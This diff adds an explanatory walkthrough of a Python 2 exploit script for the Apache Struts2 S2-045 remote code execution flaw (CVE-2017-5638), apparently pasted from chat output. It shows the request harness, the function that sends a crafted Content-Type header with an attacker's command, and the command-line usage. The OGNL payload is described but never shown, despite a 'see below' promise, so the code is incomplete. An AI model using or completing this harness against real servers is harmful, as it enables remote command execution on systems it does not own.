@@ -1,0 +1,72 @@
+This script is a Python implementation of an exploit for the Apache Struts2 S2-045 vulnerability, also known as CVE-2017-5638. This vulnerability allows remote attackers to execute arbitrary commands via a crafted Content-Type, leading to remote code execution on the server.
+
+Shebang and Encoding Declaration:
+
+python
+Copy code
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+These lines are commonly found at the beginning of 
+Python scripts. The shebang line (#!/usr/bin/python) 
+specifies the interpreter to be used, 
+and the encoding declaration (-*- coding: utf-8 -*-) 
+indicates the character encoding of the source code.
+
+Import Statements:
+
+python
+Copy code
+import urllib2
+import httplib
+The script imports the urllib2 module for making HTTP 
+requests and the httplib module for handling HTTP 
+connections.
+
+Exploit Function:
+
+python
+Copy code
+def exploit(url, cmd):
+    # ... (see below for the payload)
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
+        request = urllib2.Request(url, headers=headers)
+        page = urllib2.urlopen(request).read()
+    except httplib.IncompleteRead, e:
+        page = e.partial
+
+    print(page)
+    return page
+The exploit function takes a target URL (url) 
+and a command (cmd) as parameters.
+It constructs a payload using the S2-045 
+vulnerability and sends a crafted HTTP request to the target.
+The server's response is printed to the console.
+
+Payload:
+The payload is a specially crafted string designed 
+to exploit the Apache Struts2 vulnerability.
+ It uses the Object Graph Navigation Language (OGNL) 
+ to execute arbitrary commands on the server.
+  The payload manipulates the request headers and includes
+   the command to be executed.
+
+Main Block:
+
+python
+Copy code
+if __name__ == '__main__':
+    import sys
+    if len(sys.argv) != 3:
+        print("[*] struts2_S2-045.py <url> <cmd>")
+    else:
+        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
+        url = sys.argv[1]
+        cmd = sys.argv[2]
+        print("[*] cmd: %s\n" % cmd)
+        exploit(url, cmd)
+The script checks if it's being run as the main module.
+If so, it expects two command-line arguments:
+ the target URL and the command to execute.
+  It then calls the exploit function with these arguments.
+  
